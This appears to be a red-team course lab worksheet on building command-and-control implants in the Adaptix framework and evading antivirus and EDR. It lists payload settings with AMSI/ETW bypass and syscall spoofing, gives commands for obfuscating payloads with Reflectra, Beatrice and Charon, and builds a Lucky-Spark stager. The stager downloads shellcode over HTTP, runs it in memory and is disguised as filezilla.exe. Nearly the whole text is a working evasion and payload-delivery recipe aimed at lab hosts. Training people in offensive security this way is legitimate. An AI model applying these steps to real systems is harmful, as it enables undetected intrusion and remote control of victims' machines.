# LAB 2 — Payload Generation & AV/EDR Evasion

---

## Task 1 — Create Payload Directory

```bash
mkdir -p ~/AdaptixProjects/<YOUR PROJECT>/Payloads
```

---

## Task 2 — Generate Payloads

To generate a payload: click the desired listener → right-click → `Generate agent`. Save all payloads to `~/AdaptixProjects/<YOUR PROJECT>/Payloads`.

- **Payload 1:**
    - Listener: `HTTP`
    - Agent: `beacon`
    - Profile: `basic_agent`
    - Format: `Exe`
    - Save as: `basic_agent.x64.exe`

- **Payload 2:**
    - Listener: `HTTP`
    - Agent: `beacon`
    - Profile: `basic_agent`
    - Format: `Exe`
    - Save as: `beatrice_agent.x64.exe`

- **Payload 3:**
    - Listener: `HTTP`
    - Agent: `beacon`
    - Profile: `basic_shellcode`
    - Format: `Shellcode`
    - Save as: `basic_agent.x64.bin`

- **Payload 4:**
    - Listener: `HTTP`
    - Agent: `beacon`
    - Profile: `basic_dll`
    - Format: `DLL`
    - Save as: `basic_agent.x64.dll`

- **Payload 5:**
    - Listener: `HTTP`
    - Agent: `CrystalForge`
    - Profile: `crystal_dll`
    - Format: `DLL`
    - Save as: `crystal_agent.x64.dll`

- **Payload 6:**
    - Listener: `HTTP`
    - Agent: `CrystalForge`
    - Profile: `crystal_shellcode`
    - Format: `Shellcode`
    - Save as: `crystal_agent.x64.bin`

- **Payload 7:**
    - Listener: `GopherTCP`
    - Agent: `gopher`
    - Profile: `gopher_linux`
    - OS: `linux`
    - Save as: `gopher_agent.elf`

- **Payload 8:**
    - Listener: `GopherTCP`
    - Agent: `gopher`
    - Profile: `gopher_windows`
    - OS: `windows`
    - Save as: `gopher_agent.exe`

- **Payload 9:**
    - Listener: `TCP-9001`
    - Agent: `CrystalForge`
    - Profile: `crystal_shellcode`
    - Format: `Shellcode`
    - Save as: `tcp_9001_agent.x64.bin`

- **Payload 10:**
    - Listener: `TCP-9001`
    - Agent: `beacon`
    - Profile: `basic_svc`
    - Format: `Service Exe`
    - Save as: `svc_agent_tcp9001.x64.exe`

- **Payload 11:**
    - Listener: `SMB`
    - Agent: `CrystalForge`
    - Profile: `crystal_shellcode`
    - Format: `Shellcode`
    - Save as: `smb_agent.x64.bin`

- **Payload 12:**
    - Listener: `KharonHTTP`
    - Agent: `kharon`
    - Profile: `kharon_agent`
    - Format: `Exe`
    - Fork pipename: `\\.\pipe\LOCAL\mojo.18848.18960.615186056296201775`
    - Spawn to: `C:\Windows\System32\werfault.exe`
    - Bypass: `AMSI + ETW`
    - Syscall: `Stack Spoof + Indirect + BOF API Proxy`
    - Sleep Mask: `Timer + Heap Obfuscation`
    - Save as: `Kharon.x64.exe`

- **Payload 13:**
    - Listener: `LoadConfig`
    - Click `Load profile from file` and select `BeaconConfig.json`
    - Profile `Agent Config`
    - Save as: `loaded_agent.x64.exe`

---

## Task 3 — Modify with Reflectra

Modify `basic_agent.x64.dll` with Reflectra:
```bash
cd /opt/reflectra
./build.sh ~/AdaptixProjects/<YOUR PROJECT>/Payloads/basic_agent.x64.dll ~/AdaptixProjects/<YOUR PROJECT>/Payloads/reflectra
```


---

## Task 4 — Modify with Beatrice

Modify `beatrice_agent.x64.exe` with Beatrice:
```bash
cd /opt/beatrice
source .venv/bin/activate
python3 beatrice.py /home/kali/AdaptixProjects/<YOUR PROJECT>/Payloads/beatrice_agent.x64.exe
deactivate
```

---

## Task 5 — Copy Payloads to Win11

```bash
scp ~/AdaptixProjects/<YOUR PROJECT>/Payloads/* vagrant@192.168.57.31:C:/DevTools/
scp ~/AdaptixProjects/<YOUR PROJECT>/Payloads/reflectra/stub.exe vagrant@192.168.57.31:C:/DevTools/reflectra.exe
```

---

## Task 6 — Modify with Charon

On the Windows 11 host open **x64 Native Tools Command Prompt for VS 2022**:
```cmd
cd C:\DevTools\RedTeamGrimoire\Charon\Charon_ExternalPayloadVersion

cl Charon.c

py UUIDEncrypter.py C:\DevTools\basic_agent.x64.bin basic_agent.enc

Charon.exe

copy CharonArtifact.exe C:\DevTools\CharonArtifact.exe

copy basic_agent.enc C:\DevTools\basic_agent.enc
```

---

## Task 7 — Build Lucky-Spark Stager

Lucky-Spark is a shellcode stager that fetches a remote payload over HTTP and executes it in memory using a fiber-based loader. The URL and User-Agent are obfuscated in the binary using a randomly generated Affine cipher — every build produces a different obfuscation.

### Part 1 — Fix Lucky-Spark Headers

Download an older version of Luck-Spark. Updates from 7/13 are not working correctly
```bash
git clone https://github.com/orthrus1775/Lucky-Spark.git ~/Lucky-Spark
```
Update Lucky-Spark 
```bash
sed -i 's/#include <windows.h>/#pragma push_macro("A")\n#pragma push_macro("B")\n#undef A\n#undef B\n#include <windows.h>\n#pragma pop_macro("B")\n#pragma pop_macro("A")/' ~/Lucky-Spark/inc/my_kernel32.h

sed -i 's/#include <windows.h>/#pragma push_macro("A")\n#pragma push_macro("B")\n#undef A\n#undef B\n#include <windows.h>\n#pragma pop_macro("B")\n#pragma pop_macro("A")/' ~/Lucky-Spark/inc/my_library_utils.h
```

### Part 2 — Build the Stager

```bash
cd ~/Lucky-Spark
bash luckySpark.sh -u http://192.168.57.40:1918/basic_agent.x64.bin
```

The script outputs the generated Affine cipher parameters (`A`, `B`, `INV_A`) — these change every build. The output binary is `filezilla.exe`.

### Part 3 — Copy to WS01

```bash
scp ~/Lucky-Spark/filezilla.exe vagrant@192.168.57.31:C:/DevTools/filezilla.exe
```
